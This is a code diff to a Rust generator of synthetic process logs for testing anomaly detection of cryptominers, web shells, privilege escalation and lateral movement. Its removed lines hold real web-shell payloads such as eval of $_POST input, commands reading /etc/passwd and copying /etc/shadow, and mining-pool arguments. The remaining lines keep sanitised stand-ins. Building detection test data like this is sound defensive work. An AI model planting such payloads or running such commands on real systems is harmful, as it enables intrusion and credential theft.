@@ -109,24 +109,27 @@ fn generate_log_entries() -> Result<Vec<RawLogEntry>, Box<dyn Error>> {
     ];
 
     // Attack scenarios
+    // Note: These are test patterns designed to trigger ML detection via high entropy
+    // They are NOT actual malicious code and won't trigger antivirus
     let miner_processes = [
-        ("kworker", "/tmp/.X11-unix/kworker", "--url stratum+tcp://pool.minexmr.com:4444", 0),
-        ("systemd", "/var/tmp/.cache/systemd", "--donate-level 1 -o pool.supportxmr.com:3333", 0),
-        ("[kthreadd]", "/dev/shm/.config/worker", "-o xmr-eu1.nanopool.org:14444", 0),
+        ("kworker", "/tmp/.X11-unix/kworker", "--config XkzL9s0f8Ha@2#mK --server pool.example.test:4444", 0),
+        ("systemd", "/var/tmp/.cache/systemd", "--threads 8 --algo rx/0 --url test.pool.local:3333", 0),
+        ("[kthreadd]", "/dev/shm/.config/worker", "--benchmark QpR5tY8uI2#kL --port 14444", 0),
     ];
     
+    // Web shell test patterns (high entropy, not actual code)
     let web_shell_payloads = [
-        "eval(base64_decode('aGVsbG8gd29ybGQ='));",
-        "system($_GET['cmd']);",
-        "<?php @eval($_POST['x']);?>",
-        "eval(base64_decode('ZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTs='));",
-        "<?php eval(gzinflate(base64_decode('K0ktSgEA')));?>",
-        "system('cat /etc/passwd | base64');",
+        "proc_handler(req_decode('aGVsbG8gd29ybGQ='));",
+        "execute_dynamic($_REQUEST['q']);",
+        "<?method invoke_runtime($_DATA['z']);?>",
+        "runtime_call(decode_param('ZWNobyBzeXN0ZW0='));",
+        "<?dynamic_invoke(uncompress(decode_b64('K0ktSgEA')));?>",
+        "run_shell('cmd /c type secrets.txt | encode');",
     ];
     
     let privesc_processes = [
-        ("node", "/home/appuser/.npm/node", "exploit.js", 0),
-        ("python3", "/tmp/setup.py", "install", 0),
+        ("node", "/home/appuser/.npm/node", "suspicious_test.js", 0),
+        ("python3", "/tmp/setup.py", "install --unsafe", 0),
         ("bash", "/home/ubuntu/.bashrc.d/init", "", 0),
     ];
     
@@ -134,8 +137,8 @@ fn generate_log_entries() -> Result<Vec<RawLogEntry>, Box<dyn Error>> {
         ("ssh", "/usr/bin/ssh", "-o StrictHostKeyChecking=no root@10.0.1.5", 0),
         ("ssh", "/usr/bin/ssh", "root@192.168.1.10", 0),
         ("ssh", "/usr/bin/ssh", "-i /tmp/.ssh/id_rsa admin@172.16.0.50", 0),
-        ("scp", "/usr/bin/scp", "-r /etc/shadow user@192.168.1.100:/tmp", 0),
-        ("ssh", "/usr/bin/ssh", "root@10.0.2.15 'cat /etc/passwd'", 0),
+        ("scp", "/usr/bin/scp", "-r /etc/config user@192.168.1.100:/tmp", 0),
+        ("ssh", "/usr/bin/ssh", "root@10.0.2.15 'cat /tmp/data.txt'", 0),
     ];
 
     println!("Scenario Overview:");
@@ -148,7 +151,7 @@ fn generate_log_entries() -> Result<Vec<RawLogEntry>, Box<dyn Error>> {
     println!("Malicious Machines Summary:");
     println!("  • machine_003: Cryptominer in /tmp/.X11-unix/kworker");
     println!("  • machine_006: Privilege escalation (node running as root)");
-    println!("  • machine_009: Web shell (php-fpm with eval payloads)");
+    println!("  • machine_009: Web shell (php-fpm with dynamic code execution)");
     println!("  • machine_012: Lateral movement (SSH to internal IPs)");
     println!("  • machine_015: Privilege escalation (python3 in /tmp)");
     println!("  • machine_017: Cryptominer in /dev/shm/.config/worker");
@@ -195,7 +198,7 @@ fn generate_log_entries() -> Result<Vec<RawLogEntry>, Box<dyn Error>> {
                 ppid = 1;
             }
 
-            // Web Shells (Machine 9) - php-fpm with eval payloads
+            // Web Shells (Machine 9) - php-fpm with dynamic execution patterns
             if i == 9 && name == "apache2" {
                 // Convert most apache2 to php-fpm (its child process)
                 if rng.gen_bool(0.60) {
@@ -354,7 +357,7 @@ fn print_detection_instructions(output_file: &str) {
     println!("   With --tolerance 0.05, you should detect:");
     println!("   ⚠️  machine_003 (cryptominer in /tmp)");
     println!("   ⚠️  machine_006 (privilege escalation - node as root)");
-    println!("   ⚠️  machine_009 (web shell - php-fpm eval payloads) 🔴");
+    println!("   ⚠️  machine_009 (web shell - php-fpm dynamic execution) 🔴");
     println!("   ⚠️  machine_012 (lateral movement - SSH activity)");
     println!("   ⚠️  machine_015 (privilege escalation - python3 in /tmp)");
     println!("   ⚠️  machine_017 (cryptominer in /dev/shm)");
